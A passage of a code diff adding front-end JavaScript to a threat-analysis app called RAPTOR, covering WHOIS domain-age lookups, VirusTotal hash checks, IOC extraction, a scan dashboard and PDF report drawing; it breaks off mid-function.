+        <div style="font-family:var(--fo);font-size:.72rem;letter-spacing:2px;color:${is404?'var(--dim2)':'var(--r)'};margin-bottom:6px">${is404?'🔍 DOMAIN NOT FOUND IN RDAP':'❌ LOOKUP FAILED'}</div>
+        <div style="font-size:.78rem;color:var(--dim2)">${is404?`<strong style="color:var(--tx)">${esc(d.domain)}</strong> returned a 404 from RDAP — this means the domain is <strong>unregistered</strong>, very new (not yet indexed), or uses a TLD with no public RDAP support (e.g. <code>.tk</code>, <code>.ml</code>).<br><br>
+        💡 For demo: try <code style="color:var(--c)">github.com</code> or <code style="color:var(--c)">google.com</code> to see a full result.`:esc(d.error)}</div>
+      </div>`;
+      $('whoisMeta').innerHTML=''; $('whoisNS').innerHTML=''; return;
+    }
+
+    const af=d.age_flag||{};
+    const alertColor=af.level==='CRITICAL'?'var(--r)':af.level==='MEDIUM'?'var(--o)':'var(--g)';
+    const alertBg=af.level==='CRITICAL'?'rgba(255,32,96,.05)':af.level==='MEDIUM'?'rgba(255,120,0,.04)':'rgba(0,200,100,.04)';
+    $('whoisAlert').innerHTML=af.msg
+      ? `<div style="padding:14px 18px;border:1.5px solid ${alertColor};background:${alertBg};border-radius:4px;animation:${af.level==='CRITICAL'?'rkP 2s infinite':'none'}">
+           <div style="font-family:var(--fo);font-size:.75rem;color:${alertColor};letter-spacing:2px;margin-bottom:4px">⚠ DOMAIN AGE ${af.level}</div>
+           <div style="font-size:.78rem">${esc(af.msg)}</div>
+         </div>`
+      : '';
+
+    const fmtDate=s=>{if(!s)return '—';try{return new Date(s).toLocaleDateString('en-IN',{year:'numeric',month:'short',day:'numeric'});}catch{return s;}};
+    $('whoisMeta').innerHTML=[
+      ['Domain',d.domain||'-'],
+      ['Registered',fmtDate(d.registration_date)],
+      ['Expires',fmtDate(d.expiration_date)],
+      ['Last Updated',fmtDate(d.last_updated)],
+      ['Age (days)',d.age_days!=null?String(d.age_days):'—'],
+      ['Registrar',d.registrar||'—'],
+    ].map(([l,v])=>`<div class="mc"><div class="ml">${l}</div><div class="mv ${l==='Age (days)'&&d.age_days<30?'bad':l==='Age (days)'&&d.age_days<180?'warn':'info'}">${esc(v)}</div></div>`).join('');
+
+    const ns=d.nameservers||[];
+    const st=d.status||[];
+    $('whoisNS').innerHTML=`
+      <div style="margin-bottom:10px"><div class="st">NAMESERVERS</div>
+        ${ns.length?ns.map(n=>`<div style="padding:5px 10px;font-size:.73rem;font-family:var(--fm);color:var(--c);background:rgba(0,82,180,.04);border-radius:3px;margin-bottom:4px">${esc(n)}</div>`).join(''):'<div style="color:var(--dim2);font-size:.7rem">None found</div>'}
+      </div>
+      <div><div class="st">STATUS FLAGS</div>
+        <div style="display:flex;flex-wrap:wrap;gap:6px">${st.length?st.map(s=>`<span style="font-size:.62rem;padding:3px 9px;border-radius:3px;background:rgba(0,82,180,.06);border:1px solid var(--b1);color:var(--dim2);font-family:var(--ft)">${esc(s)}</span>`).join(''):'—'}</div>
+      </div>`;
+
+    addHistory('whois',d.domain,d.age_days<30?'HIGH':d.age_days<180?'MEDIUM':'LOW',d.age_days<30?80:d.age_days<180?40:10);
+    $('whoisRes').style.display='block';
+    toast(`WHOIS complete — domain is ${d.age_days??'?'} days old`,'c');
+  }catch(e){
+    $('whoisLd').classList.remove('on');
+    toast('WHOIS lookup failed: '+e.message,'r');
+  }
+}
+
+// ══════════════════════════════════════════════════════════
+// FEATURE 3: VIRUSTOTAL HASH LOOKUP
+// ══════════════════════════════════════════════════════════
+async function hashLookup(){
+  const hash=$('hashIn').value.trim().toLowerCase();
+  if(!hash){toast('Paste a hash first','r');return;}
+  if(!/^[a-f0-9]{32}$|^[a-f0-9]{40}$|^[a-f0-9]{64}$/.test(hash)){toast('Invalid hash — need MD5 (32), SHA1 (40), or SHA256 (64)','r');return;}
+
+  $('hashLd').classList.add('on');
+  $('hashRes').style.display='none';
+
+  if(!backendOnline){
+    $('hashLd').classList.remove('on');
+    toast('Hash lookup requires Flask backend — start app.py','r');
+    return;
+  }
+
+  try{
+    const r=await fetch(API_BASE+'/vt/hash',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({hash})});
+    const d=await r.json();
+    $('hashLd').classList.remove('on');
+
+    if(d.error){
+      const is401=d.error.includes('401');
+      $('hashRisk').innerHTML=`<div style="padding:16px 18px;border:1px solid ${d.configured===false?'var(--o)':'var(--r)'};background:${d.configured===false?'rgba(184,77,0,.05)':'rgba(200,16,46,.05)'};border-radius:4px">
+        <div style="font-family:var(--fo);font-size:.72rem;letter-spacing:2px;color:${d.configured===false?'var(--o)':'var(--r)'};margin-bottom:8px">${d.configured===false?'⚙️ API KEY NOT SET':'❌ '+(is401?'API KEY REJECTED (401)':'VT ERROR')}</div>
+        <div style="font-size:.78rem;margin-bottom:${is401?'10px':'0'}">${esc(d.error)}</div>
+        ${is401?`<div style="font-size:.7rem;color:var(--dim2);line-height:1.9;border-top:1px solid var(--b1);padding-top:10px">
+          <strong>Fix (Windows PowerShell):</strong><br>
+          <code style="color:var(--c)">$env:VT_API_KEY = "your_key_here"</code><br>
+          <code style="color:var(--c)">python app.py</code><br>
+          <strong>Fix (Windows CMD):</strong><br>
+          <code style="color:var(--c)">set VT_API_KEY=your_key_here &amp;&amp; python app.py</code><br>
+          Get a free key → <a href="https://www.virustotal.com" target="_blank" style="color:var(--c)">virustotal.com</a> → Sign up → Profile → API Key
+        </div>`:''}
+      </div>`;
+      $('hashMeta').innerHTML=''; $('hashBar').innerHTML=''; $('hashEngines').innerHTML='';
+      $('hashTagsPanel').style.display='none';
+      $('hashRes').style.display='block'; return;
+    }
+    if(!d.found){
+      $('hashRisk').innerHTML=`<div style="padding:14px 18px;border:1px solid var(--dim);background:rgba(0,0,0,.02);border-radius:4px;font-size:.75rem;color:var(--dim2)">🔍 Hash not found in VirusTotal database — file has never been submitted.</div>`;
+      $('hashMeta').innerHTML=''; $('hashEngines').innerHTML=''; $('hashBar').innerHTML='';
+      $('hashRes').style.display='block'; return;
+    }
+
+    const v=d.verdict;
+    const vColor=v==='MALICIOUS'?'var(--r)':v==='SUSPICIOUS'?'var(--o)':'var(--g)';
+    const vLvl=v==='MALICIOUS'?'high':v==='SUSPICIOUS'?'medium':'low';
+    $('hashRisk').innerHTML=`<div class="rk ${vLvl}">
+      <div><div class="rk-l">VERDICT</div><div class="rk-v">${esc(v)}</div></div>
+      <div class="rk-r"><div class="rk-n" style="font-size:1.5rem">${d.stats?.malicious||0} / ${d.stats?.total||0}</div><span class="rk-sl">ENGINES DETECTED</span></div>
+    </div>`;
+
+    const fmtDate=ts=>{if(!ts)return'—';try{return new Date(ts*1000).toLocaleDateString('en-IN',{year:'numeric',month:'short',day:'numeric'});}catch{return String(ts);}};
+    const fmtSize=b=>{if(!b)return'—';return b>1048576?(b/1048576).toFixed(1)+' MB':b>1024?(b/1024).toFixed(1)+' KB':b+' B';};
+    $('hashMeta').innerHTML=[
+      ['Hash',hash],['Type',d.hash_type||'-'],['Name',d.name||'(unknown)'],
+      ['File Type',d.type_description||'—'],['Size',fmtSize(d.size)],
+      ['Detection Rate',d.detection_rate+'%'],['Reputation',d.reputation],
+      ['First Seen',fmtDate(d.first_seen)],['Last Analysed',fmtDate(d.last_analysis)],
+      ['Submissions',String(d.times_submitted||0)],
+    ].map(([l,v2])=>`<div class="mc"><div class="ml">${l}</div><div class="mv ${l==='Detection Rate'&&d.detection_rate>50?'bad':l==='Detection Rate'&&d.detection_rate>0?'warn':'info'}" style="word-break:break-all;font-size:.68rem">${esc(String(v2))}</div></div>`).join('');
+
+    // Detection bar
+    const s=d.stats||{};const total=s.total||1;
+    const pct=n=>Math.round(n/total*100);
+    $('hashBar').innerHTML=`
+      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:8px;margin-bottom:12px">
+        <div style="padding:8px 12px;background:rgba(200,16,46,.07);border:1px solid rgba(200,16,46,.25);border-radius:4px"><div style="font-family:var(--fo);font-size:1.1rem;color:var(--r)">${s.malicious||0}</div><div style="font-size:.54rem;color:var(--dim2);letter-spacing:2px">MALICIOUS</div></div>
+        <div style="padding:8px 12px;background:rgba(184,77,0,.06);border:1px solid rgba(184,77,0,.2);border-radius:4px"><div style="font-family:var(--fo);font-size:1.1rem;color:var(--o)">${s.suspicious||0}</div><div style="font-size:.54rem;color:var(--dim2);letter-spacing:2px">SUSPICIOUS</div></div>
+        <div style="padding:8px 12px;background:rgba(0,122,61,.05);border:1px solid rgba(0,122,61,.2);border-radius:4px"><div style="font-family:var(--fo);font-size:1.1rem;color:var(--g)">${s.harmless||0}</div><div style="font-size:.54rem;color:var(--dim2);letter-spacing:2px">HARMLESS</div></div>
+        <div style="padding:8px 12px;background:rgba(0,0,0,.03);border:1px solid var(--b1);border-radius:4px"><div style="font-family:var(--fo);font-size:1.1rem;color:var(--dim2)">${s.undetected||0}</div><div style="font-size:.54rem;color:var(--dim2);letter-spacing:2px">UNDETECTED</div></div>
+      </div>
+      <div style="height:6px;border-radius:3px;overflow:hidden;display:flex;gap:1px">
+        ${s.malicious?`<div style="flex:${s.malicious};background:var(--r)"></div>`:''}
+        ${s.suspicious?`<div style="flex:${s.suspicious};background:var(--o)"></div>`:''}
+        ${s.harmless?`<div style="flex:${s.harmless};background:var(--g)"></div>`:''}
+        ${s.undetected?`<div style="flex:${s.undetected};background:var(--b2)"></div>`:''}
+      </div>`;
+
+    const dets=d.detections||[];
+    if(dets.length){
+      $('hashEngines').innerHTML=`
+        <div style="font-size:.6rem;color:var(--dim2);letter-spacing:2px;margin-bottom:9px;font-family:var(--ft)">${dets.length} ENGINE(S) FLAGGED THIS FILE</div>
+        <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:6px">
+        ${dets.map(e=>`<div style="padding:7px 10px;border-left:3px solid ${e.category==='malicious'?'var(--r)':'var(--o)'};background:rgba(0,0,0,.02);border-radius:0 4px 4px 0">
+          <div style="font-size:.65rem;font-weight:600;color:var(--tx)">${esc(e.engine)}</div>
+          <div style="font-size:.63rem;color:${e.category==='malicious'?'var(--r)':'var(--o)'}">${esc(e.result||e.category)}</div>
+        </div>`).join('')}
+        </div>`;
+    } else {
+      $('hashEngines').innerHTML='<div style="color:var(--g);font-size:.75rem">✓ No engine detections.</div>';
+    }
+
+    const tags=d.tags||[];
+    if(tags.length){
+      $('hashTagsPanel').style.display='';
+      $('hashTags').innerHTML=tags.map(t=>`<span style="font-size:.68rem;padding:4px 11px;border-radius:99px;background:rgba(90,31,160,.08);border:1px solid rgba(90,31,160,.2);color:var(--p);margin:3px;display:inline-block">${esc(t)}</span>`).join('');
+    }
+
+    if(d.cached) toast('Result from cache (< 1hr old)','g');
+    else toast(`VT lookup complete — ${d.stats?.malicious||0} engine(s) flagged`,'c');
+    addHistory('hash',hash.slice(0,16)+'…',vLvl.toUpperCase(),pct(s.malicious||0));
+    $('hashRes').style.display='block';
+  }catch(e){
+    $('hashLd').classList.remove('on');
+    toast('Hash lookup failed: '+e.message,'r');
+  }
+}
+
+// ══════════════════════════════════════════════════════════
+// FEATURE 1: EMAIL HEADER ANALYZER
+// ══════════════════════════════════════════════════════════
+// ══════════════════════════════════════════════════════════
+// IOC EXTRACTOR
+// ══════════════════════════════════════════════════════════
+function extractIOCsPage(){
+  const txt=$('iocIn').value.trim();if(!txt){toast('Paste text first','r');return;}
+  lastIOCData=localExtractIOCs(txt);
+  const total=renderIOCGrid(lastIOCData,'iocOut');totalIOCs+=total;updateHeader();
+  $('iocRes').classList.add('on');toast(`${total} IOC(s) extracted`,total>0?'c':'g');
+}
+function copyIOCs(){
+  if(!lastIOCData)return;
+  const lines=[];for(const[k,v]of Object.entries(lastIOCData)){if(v.length){lines.push(`=== ${k.toUpperCase()} ===`);v.forEach(x=>lines.push(x));lines.push('');}}
+  navigator.clipboard.writeText(lines.join('\n')).then(()=>toast('IOCs copied','g')).catch(()=>toast('Copy failed','r'));
+}
+
+// ══════════════════════════════════════════════════════════
+// DASHBOARD
+// ══════════════════════════════════════════════════════════
+async function loadDashboard(){
+  const dc=$('dashContent');
+  dc.innerHTML='<div style="text-align:center;padding:30px;color:var(--dim2)"><div class="sp" style="display:inline-block"></div></div>';
+  if(!backendOnline){
+    renderLocalDashboard();return;
+  }
+  try{
+    const r=await fetch(API_BASE+'/stats');const d=await r.json();
+    const high=d.by_risk?.HIGH||0,med=d.by_risk?.MEDIUM||0,low=d.by_risk?.LOW||0;
+    let html=`
+    <div class="srow">
+      <div class="sb2" style="border-top-color:var(--c)"><span class="sn" style="color:var(--c)">${d.total_scans}</span><span class="sl">TOTAL SCANS</span></div>
+      <div class="sb2" style="border-top-color:var(--r)"><span class="sn" style="color:var(--r)">${high}</span><span class="sl">HIGH RISK</span></div>
+      <div class="sb2" style="border-top-color:var(--o)"><span class="sn" style="color:var(--o)">${med}</span><span class="sl">MEDIUM RISK</span></div>
+      <div class="sb2" style="border-top-color:var(--g)"><span class="sn" style="color:var(--g)">${low}</span><span class="sl">LOW RISK</span></div>
+      <div class="sb2" style="border-top-color:var(--y)"><span class="sn" style="color:var(--y)">${d.total_iocs}</span><span class="sl">TOTAL IOCs</span></div>
+    </div>`;
+    if(d.top_mitre?.length){
+      html+=`<div class="sec"><div class="st">⚔️ TOP MITRE TECHNIQUES (DATABASE)</div><div class="panel" style="padding:12px">`;
+      d.top_mitre.forEach(m=>{
+        html+=`<div style="display:flex;align-items:center;gap:10px;padding:6px 0;border-bottom:1px solid var(--b1)">
+          <span style="font-family:var(--fo);font-size:.65rem;color:var(--p);width:100px">${m.technique}</span>
+          <span style="flex:1;font-size:.76rem;color:var(--tx)">${m.name||'Unknown'}</span>
+          <span style="font-family:var(--fo);font-size:.7rem;color:var(--c)">${m.cnt}×</span>
+          <div style="width:120px;height:6px;background:var(--b1);border-radius:3px;overflow:hidden"><div style="height:100%;background:var(--p);width:${Math.min((m.cnt/d.total_scans)*100*3,100)}%"></div></div>
+        </div>`;
+      });
+      html+='</div></div>';
+    }
+    if(d.by_type?.length){
+      html+=`<div class="sec"><div class="st">📊 SCANS BY TYPE</div><div class="mg">`;
+      d.by_type.forEach(t=>{
+        const col=t.scan_type==='zip'?'var(--c)':t.scan_type==='ps'?'var(--o)':'var(--g)';
+        html+=`<div class="mc"><div class="ml">${t.scan_type.toUpperCase()} SCANS</div><div class="mv" style="color:${col};font-family:var(--fo);font-size:1.4rem;font-weight:900">${t.cnt}</div></div>`;
+      });
+      html+='</div></div>';
+    }
+    if(d.recent_scans?.length){
+      html+=`<div class="sec"><div class="st">🕐 RECENT SCANS</div><div class="panel"><ul class="il">`;
+      d.recent_scans.forEach(s=>{
+        const col=s.risk_level==='HIGH'?'var(--r)':s.risk_level==='MEDIUM'?'var(--o)':'var(--g)';
+        html+=`<li class="ii"><span class="tag ti">${s.scan_type.toUpperCase()}</span><div class="ii-body">
+          <span>${esc(s.target_name)}</span>
+          <div style="font-size:.6rem;color:${col};font-family:var(--fo);margin-top:2px">${s.risk_level} · ${s.risk_score}/100 · ${s.created_at}</div>
+        </div></li>`;
+      });
+      html+='</ul></div></div>';
+    }
+    dc.innerHTML=html;
+  }catch(e){renderLocalDashboard();}
+}
+
+function renderLocalDashboard(){
+  const high=sessionScans.filter(s=>s.risk==='HIGH').length;
+  const med=sessionScans.filter(s=>s.risk==='MEDIUM').length;
+  const low=sessionScans.filter(s=>s.risk==='LOW').length;
+  $('dashContent').innerHTML=`
+    <div style="padding:10px 0 14px;font-size:.65rem;color:var(--o);font-family:var(--ft);letter-spacing:1px">⚠️ Showing session data only. Start Flask backend for full database stats.</div>
+    <div class="srow">
+      <div class="sb2" style="border-top-color:var(--c)"><span class="sn" style="color:var(--c)">${sessionScans.length}</span><span class="sl">SCANS</span></div>
+      <div class="sb2" style="border-top-color:var(--r)"><span class="sn" style="color:var(--r)">${high}</span><span class="sl">HIGH</span></div>
+      <div class="sb2" style="border-top-color:var(--o)"><span class="sn" style="color:var(--o)">${med}</span><span class="sl">MEDIUM</span></div>
+      <div class="sb2" style="border-top-color:var(--g)"><span class="sn" style="color:var(--g)">${low}</span><span class="sl">LOW</span></div>
+      <div class="sb2" style="border-top-color:var(--y)"><span class="sn" style="color:var(--y)">${totalIOCs}</span><span class="sl">IOCs</span></div>
+    </div>
+    ${sessionScans.length?`<div class="sec"><div class="st">SESSION SCANS</div><div class="panel"><ul class="il">${sessionScans.map(s=>`<li class="ii"><span class="tag ti">${s.type}</span><div class="ii-body"><span>${esc(s.name)}</span><div style="font-size:.6rem;color:${s.risk==='HIGH'?'var(--r)':s.risk==='MEDIUM'?'var(--o)':'var(--g)'};font-family:var(--fo);margin-top:2px">${s.risk} · ${s.score}/100 · ${s.time}</div></div></li>`).join('')}</ul></div></div>`:''}`;
+}
+
+// ══════════════════════════════════════════════════════════
+// PDF EXPORT
+// ══════════════════════════════════════════════════════════
+
+
+const PDF_THEME = {
+  pageBg:        [248, 249, 251],
+  headerBg:      [ 27,  43,  75],
+  footerBg:      [ 27,  43,  75],
+  cardBg:        [255, 255, 255],
+  rowAlt:        [245, 247, 250],
+  border:        [210, 218, 230],
+  divider:       [226, 232, 240],
+  accent:        [ 37,  99, 235],
+  headingText:   [255, 255, 255],
+  titleText:     [ 15,  23,  42],
+  bodyText:      [ 51,  65,  85],
+  dimText:       [100, 116, 139],
+  highFg:        [185,  28,  28],
+  highBg:        [254, 226, 226],
+  highBorder:    [252, 165, 165],
+  medFg:         [180,  83,   9],
+  medBg:         [255, 237, 213],
+  medBorder:     [253, 186, 116],
+  lowFg:         [ 21, 128,  61],
+  lowBg:         [220, 252, 231],
+  lowBorder:     [134, 239, 172],
+  infoFg:        [ 29,  78, 216],
+  infoBg:        [219, 234, 254],
+  watermarkText: [180, 186, 200],
+};
+
+function _pdfFill(doc, rgb) { doc.setFillColor(...rgb); }
+function _pdfDraw(doc, rgb) { doc.setDrawColor(...rgb); }
+function _pdfText(doc, rgb) { doc.setTextColor(...rgb); }
+
+function _drawWatermark(doc, pageW, pageH) {
+  try { doc.setGState(new doc.GState({ opacity: 0.045 })); } catch(e) {}
+  _pdfText(doc, PDF_THEME.watermarkText);
+  doc.setFontSize(68);
+  doc.setFont('helvetica', 'bold');
+  const cx = pageW / 2, cy = pageH / 2;
+  doc.text('RAPTOR', cx, cy - 8,  { angle: 45, align: 'center' });
+  doc.text('RAPTOR', cx, cy + 48, { angle: 45, align: 'center' });
+  try { doc.setGState(new doc.GState({ opacity: 1 })); } catch(e) {}
+}
+
+function _drawPageBackground(doc, pageW, pageH) {
+  _pdfFill(doc, PDF_THEME.pageBg);
+  doc.rect(0, 0, pageW, pageH, 'F');
+}
+
+function _drawHeader(doc, pageW, scanType, reportTitle) {
+  const hH = 22;
+  _pdfFill(doc, PDF_THEME.headerBg);
+  doc.rect(0, 0, pageW, hH, 'F');
+  _pdfFill(doc, PDF_THEME.accent);
+  doc.rect(0, 0, 3.5, hH, 'F');
+  _pdfText(doc, [255, 255, 255]);
+  doc.setFontSize(13);
+  doc.setFont('helvetica', 'bold');
+  doc.text('RAPTOR', 8, 10);
+  _pdfFill(doc, [80, 100, 140]);
+  doc.rect(37, 5, 0.4, 12, 'F');
+  doc.setFontSize(8.5);
+  doc.setFont('helvetica', 'normal');
+  _pdfText(doc, [188, 205, 230]);
+  doc.text('THREAT ANALYSIS PLATFORM', 41, 9);
+  _pdfText(doc, [255, 255, 255]);
+  doc.setFontSize(7.5);
+  doc.text(reportTitle || 'SECURITY REPORT', 41, 15.5);
+  _pdfText(doc, [188, 205, 230]);
+  doc.setFontSize(6.5);
+  doc.setFont('helvetica', 'bold');
+  doc.text(((scanType || 'SCAN').toUpperCase()) + ' ANALYSIS', pageW - 6, 13, { align: 'right' });
+}
+
+function _drawFooter(doc, pageW, pageH, pageNum, totalPages, userName) {
+  const fH = 9, fY = pageH - fH;
+  _pdfFill(doc, PDF_THEME.headerBg);
+  doc.rect(0, fY, pageW, fH, 'F');
+  _pdfFill(doc, PDF_THEME.accent);
+  doc.rect(0, fY, 3.5, fH, 'F');
+  doc.setFontSize(6);
+  doc.setFont('helvetica', 'normal');
+  _pdfText(doc, [188, 205, 230]);
+  const ts = new Date().toLocaleString('en-IN', { hour12: false });
+  const userPart = userName ? `  ·  ${userName}` : '';
+  doc.text(`Generated: ${ts}${userPart}`, 7, fY + 5.8);
+  _pdfText(doc, [255, 255, 255]);
+  doc.setFont('helvetica', 'bold');
+  doc.text('RAPTOR', pageW / 2, fY + 5.8, { align: 'center' });
+  _pdfText(doc, [188, 205, 230]);
+  doc.setFont('helvetica', 'normal');
+  doc.text(`Page ${pageNum} of ${totalPages}`, pageW - 7, fY + 5.8, { align: 'right' });
+}
+
+function _drawSectionLabel(doc, x, y, label, cw) {
+  _pdfDraw(doc, PDF_THEME.divider);
+  doc.setLineWidth(0.3);
+  doc.line(x, y, x + cw, y);
+  _pdfText(doc, PDF_THEME.accent);
+  doc.setFontSize(6.2);
+  doc.setFont('helvetica', 'bold');
+  doc.text(label.toUpperCase(), x, y + 5.5);
+  return y + 8;
+}
+
+function _riskColors(lvl) {
+  if (lvl === 'HIGH')   return { fg: PDF_THEME.highFg, bg: PDF_THEME.highBg, border: PDF_THEME.highBorder };
+  if (lvl === 'MEDIUM') return { fg: PDF_THEME.medFg,  bg: PDF_THEME.medBg,  border: PDF_THEME.medBorder  };
+  return                       { fg: PDF_THEME.lowFg,  bg: PDF_THEME.lowBg,  border: PDF_THEME.lowBorder  };
+}
+
+function _tagColors(tag) {
+  const t = (tag || '').toUpperCase();
+  if (t === 'CRITICAL' || t === 'HIGH')  return _riskColors('HIGH');
+  if (t === 'MEDIUM'   || t === 'WARN')  return _riskColors('MEDIUM');
+  if (t === 'LOW'      || t === 'INFO')  return _riskColors('LOW');
+  return { fg: PDF_THEME.infoFg, bg: PDF_THEME.infoBg, border: [147, 197, 253] };
+}
+
+function _drawCard(doc, x, y, w, h) {
+  _pdfFill(doc, PDF_THEME.cardBg);
+  _pdfDraw(doc, PDF_THEME.border);
+  doc.setLineWidth(0.25);
+  doc.roundedRect(x, y, w, h, 1.5, 1.5, 'FD');
+}
+
+function _checkPageBreak(doc, y, threshold, pageH, pageW, scanType, reportTitle) {
+  if (y > threshold) {
+    doc.addPage();
+    _drawPageBackground(doc, pageW, pageH);
+    _drawWatermark(doc, pageW, pageH);
+    _drawHeader(doc, pageW, scanType, reportTitle);
+    return 30;
+  }
+  return y;
+}
+
+function _drawScoreGauge(doc, x, y, score, lvl) {
+  const { fg, bg } = _riskColors(lvl);
+  const gW = 42, gH = 24;
+  _drawCard(doc, x, y, gW, gH);
+  _pdfFill(doc, fg);
+  doc.roundedRect(x, y, 2, gH, 0.5, 0.5, 'F');
+  _pdfFill(doc, bg);
+  _pdfDraw(doc, fg);
+  doc.setLineWidth(0.3);
+  doc.roundedRect(x + 3, y + 1.5, gW - 5, 6, 0.8, 0.8, 'FD');
+  _pdfText(doc, fg);
+  doc.setFontSize(5.8);
+  doc.setFont('helvetica', 'bold');
+  doc.text(lvl + ' RISK', x + (gW / 2) + 0.5, y + 5.5, { align: 'center' });
+  _pdfText(doc, fg);
+  doc.setFontSize(22);
+  doc.setFont('helvetica', 'bold');
+  doc.text(String(score), x + (gW / 2) + 0.5, y + 17, { align: 'center' });
+  _pdfText(doc, PDF_THEME.dimText);
+  doc.setFontSize(6.5);
+  doc.setFont('helvetica', 'normal');
+  doc.text('/ 100', x + (gW / 2) + 0.5, y + 21, { align: 'center' });
+}
+
+function _drawSummaryCard(doc, ml, y, w, scanName, scanType, stats) {
+  const cardH = 24;
+  _drawCard(doc, ml, y, w, cardH);
+  _pdfText(doc, PDF_THEME.dimText);
+  doc.setFontSize(6.5);
+  doc.setFont('helvetica', 'bold');
+  doc.text('SCAN TARGET', ml + 4, y + 6);
+  _pdfText(doc, PDF_THEME.titleText);
+  doc.setFontSize(8.5);
+  doc.setFont('helvetica', 'normal');
+  const nameStr = (scanName || 'N/A').length > 52 ? (scanName || 'N/A').substring(0, 52) + '…' : (scanName || 'N/A');
+  doc.text(nameStr, ml + 4, y + 13);
+  _pdfDraw(doc, PDF_THEME.divider);
+  doc.setLineWidth(0.2);
+  doc.line(ml + 4, y + 16, ml + w - 4, y + 16);
+  const ts = new Date().toLocaleString('en-IN', { hour12: false });
+  _pdfText(doc, PDF_THEME.dimText);
+  doc.setFontSize(6.2);
+  doc.setFont('helvetica', 'normal');
+  doc.text(`Type: ${(scanType || '').toUpperCase()}`, ml + 4, y + 21);
+  doc.text(`Generated: ${ts}`, ml + 52, y + 21);
+  if (stats && stats.total) doc.text(`Files: ${stats.total}`, ml + 140, y + 21);
+  return y + cardH + 5;
+}
+
+function _drawStatsBar(doc, ml, y, cw, statItems) {
+  if (!statItems || !statItems.length) return y;
+  const cols = Math.min(statItems.length, 5);
+  const cellW = cw / cols;
+  const cellH = 18;
+  statItems.slice(0, cols).forEach((item, i) => {
+    const cx = ml + i * cellW;
+    _drawCard(doc, cx, y, cellW - 2, cellH);
+    _pdfText(doc, item.color || PDF_THEME.titleText);
+    doc.setFontSize(14);
+    doc.setFont('helvetica', 'bold');
+    doc.text(String(item.value ?? 0), cx + (cellW - 2) / 2, y + 11, { align: 'center' });
+    _pdfText(doc, PDF_THEME.dimText);
+    doc.setFontSize(5.5);
+    doc.setFont('helvetica', 'normal');
+    doc.text((item.label || '').toUpperCase(), cx + (cellW - 2) / 2, y + 15.5, { align: 'center' });
+  });
+  return y + cellH + 6;
+}
+
+function _drawIndicatorsTable(doc, ml, y, cw, indicators, pageH, pageW, scanType, reportTitle) {
+  if (!indicators || !indicators.length) return y;
+  const tHdrH = 8;
+  const drawTblHeader = (yy) => {
+    _pdfFill(doc, [237, 242, 255]);
+    _pdfDraw(doc, PDF_THEME.border);
+    doc.setLineWidth(0.25);
+    doc.roundedRect(ml, yy, cw, tHdrH, 1, 1, 'FD');
+    _pdfText(doc, PDF_THEME.infoFg);
+    doc.setFontSize(6.2);
+    doc.setFont('helvetica', 'bold');
+    doc.text('SEVERITY',               ml + 3,       yy + 5.2);
+    doc.text('INDICATOR / DESCRIPTION',ml + 28,      yy + 5.2);
+    doc.text('MITRE',                  ml + cw - 25, yy + 5.2);
+    return yy + tHdrH;
+  };
+  y = drawTblHeader(y);
+  indicators.forEach((ind, idx) => {
+    const rowH = 10;
+    if (y + rowH > pageH - 18) {
+      doc.addPage();
+      _drawPageBackground(doc, pageW, pageH);
+      _drawWatermark(doc, pageW, pageH);
+      _drawHeader(doc, pageW, scanType, reportTitle);
+      y = 30;
+      y = drawTblHeader(y);
+    }
+    const { fg: tFg, bg: tBg } = _tagColors(ind.tag);
+    _pdfFill(doc, idx % 2 === 0 ? PDF_THEME.cardBg : PDF_THEME.rowAlt);
+    _pdfDraw(doc, PDF_THEME.divider);
+    doc.setLineWidth(0.12);
+    doc.rect(ml, y, cw, rowH, 'FD');
+    _pdfFill(doc, tBg);
+    _pdfDraw(doc, tFg);
+    doc.setLineWidth(0.25);
+    doc.roundedRect(ml + 2, y + 2, 22, 5.5, 0.6, 0.6, 'FD');
+    _pdfText(doc, tFg);
+    doc.setFontSize(5.5);
+    doc.setFont('helvetica', 'bold');
+    doc.text((ind.tag || 'INFO').toUpperCase(), ml + 13, y + 5.8, { align: 'center' });
+    _pdfText(doc, PDF_THEME.bodyText);
+    doc.setFontSize(6.5);
+    doc.setFont('helvetica', 'normal');
+    doc.text((ind.text || ind.txt || '').substring(0, 90), ml + 27, y + 6.2);
+    if (ind.mitre) {
+      _pdfText(doc, PDF_THEME.dimText);
+      doc.setFontSize(5.8);
+      doc.text((ind.mitre || '').substring(0, 12), ml + cw - 24, y + 6.2);
+    }
+    y += rowH;
+  });
+  _pdfDraw(doc, PDF_THEME.border);
+  doc.setLineWidth(0.3);
+  doc.line(ml, y, ml + cw, y);
+  return y + 6;
+}
+
+function _drawIOCTable(doc, ml, y, cw, iocs, pageH, pageW, scanType, reportTitle) {
+  const iocTypes = Object.entries(iocs || {}).filter(([, v]) => v && v.length);
+  if (!iocTypes.length) return y;
+  iocTypes.forEach(([iocType, vals]) => {
+    if (y > pageH - 30) {
+      doc.addPage();
+      _drawPageBackground(doc, pageW, pageH);
+      _drawWatermark(doc, pageW, pageH);
+      _drawHeader(doc, pageW, scanType, reportTitle);
+      y = 28;
+    }
+    _pdfFill(doc, [245, 247, 250]);
+    _pdfDraw(doc, PDF_THEME.border);
+    doc.setLineWidth(0.25);
+    doc.rect(ml, y, cw, 7, 'FD');
+    _pdfFill(doc, PDF_THEME.accent);
+    doc.rect(ml, y, 2.5, 7, 'F');
+    _pdfText(doc, PDF_THEME.infoFg);
+    doc.setFontSize(6.5);
+    doc.setFont('helvetica', 'bold');
+    doc.text(`${iocType.toUpperCase()}  (${vals.length} extracted)`, ml + 5, y + 4.8);
+    y += 7;
+    vals.slice(0, 12).forEach((v, idx) => {
+      if (y > pageH - 20) {
+        doc.addPage();
+        _drawPageBackground(doc, pageW, pageH);
+        _drawWatermark(doc, pageW, pageH);
+        _drawHeader(doc, pageW, scanType, reportTitle);
+        y = 28;
+      }
+      const rowH = 7;
+      _pdfFill(doc, idx % 2 === 0 ? PDF_THEME.cardBg : PDF_THEME.rowAlt);
+      _pdfDraw(doc, PDF_THEME.divider);
+      doc.setLineWidth(0.1);
+      doc.rect(ml, y, cw, rowH, 'FD');
+      _pdfFill(doc, PDF_THEME.accent);
+      doc.circle(ml + 4, y + 3.5, 0.8, 'F');
+      _pdfText(doc, PDF_THEME.bodyText);
+      doc.setFontSize(6.5);
+      doc.setFont('helvetica', 'normal');
+      doc.text(String(v).substring(0, 100), ml + 8, y + 4.8);
+      y += rowH;
+    });
+    if (vals.length > 12) {
